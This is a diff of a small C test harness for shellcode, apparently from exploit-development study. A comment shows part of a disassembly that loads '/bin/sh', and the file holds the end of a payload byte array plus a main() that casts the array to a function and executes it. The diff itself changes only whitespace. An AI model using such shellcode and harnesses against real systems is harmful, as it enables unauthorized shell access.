@@ -16,6 +16,7 @@ Disassembly of section .text:
   400093:       2f62696e2f7368          ASCII '/bin/sh'
  */
 
+
 #include<stdio.h>
 #include<string.h>
 
@@ -30,6 +31,6 @@ unsigned char payload[] =
 "\x2f\x73\x68";
 
 void main() {
-printf("Shellcode Length: %d\n", (int) strlen(payload));
-(*(void (*)()) payload)();
+	printf("Shellcode Length: %d\n", (int) strlen(payload));
+	(*(void (*)()) payload)();
 }
